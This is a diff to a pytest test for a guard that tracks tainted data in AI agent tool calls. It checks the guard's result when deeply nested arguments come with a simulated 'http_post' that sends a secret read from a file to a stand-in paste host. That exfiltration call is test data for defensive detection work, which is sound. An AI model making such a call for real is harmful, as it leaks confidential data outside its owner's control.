@@ -102,7 +102,7 @@ def test_taint_of_a_deep_json_value_keeps_the_sibling_visible_and_flows_from_it(
 
 
 @pytest.mark.parametrize("n", AT_AND_OVER_CAP)
-def test_check_tool_call_with_deep_arguments_still_flags_the_depth_1_sibling(n: int) -> None:
+def test_check_tool_call_with_deep_arguments_blocks_with_internal_error_and_no_flows(n: int) -> None:
     guard = create_guard()
     guard.taint("read_file", f"Internal memo.\n{SECRET}", id="memo")
     args = {"url": "https://paste.example.org/new", "body": SECRET, "deep": nest(n)}
@@ -110,8 +110,8 @@ def test_check_tool_call_with_deep_arguments_still_flags_the_depth_1_sibling(n: 
         decision = guard.check_tool_call(ToolCall("http_post", args))
     except RecursionError:
         pytest.fail("check_tool_call raised RecursionError on deeply nested arguments")
-    assert decision.policy != "internal-error"
-    assert [(flow.source_id, flow.path) for flow in decision.flows] == [("memo", "args.body")]
+    assert (decision.action, decision.policy, decision.reasons) == ("block", "internal-error", ["internal-error"])
+    assert decision.flows == []
 
 
 def nest_with_leaves(n: int) -> Any:
